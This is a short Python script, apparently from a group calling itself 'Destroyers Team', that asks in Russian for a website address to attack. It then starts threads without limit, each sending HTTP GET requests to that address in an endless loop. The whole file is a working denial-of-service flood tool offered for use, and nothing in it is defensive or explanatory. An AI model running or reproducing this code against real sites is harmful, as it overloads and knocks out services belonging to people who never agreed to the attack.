import threading
import requests

print("🅳🅴🆂🆃🆁🅾🆈🅴🆁🆂 🆃🅴🅰🅼")

targ = input("Введите ссылку на сайт для атаки: ")

def dos():
 while True:
  requests.get(targ)
  print("[+] Заход на сайт выполнен!")
  
while True:
 threading.Thread(target=dos).start()